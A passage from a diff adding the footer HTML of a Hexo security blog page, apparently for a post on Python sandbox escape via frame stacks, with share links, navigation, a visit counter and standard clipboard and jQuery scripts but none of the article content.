+  <li><a class="icon" href="mailto:?subject=python沙箱逃逸特辑-帧栈逃逸&body=Check out this article: https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&name=python沙箱逃逸特辑-帧栈逃逸&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&t=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
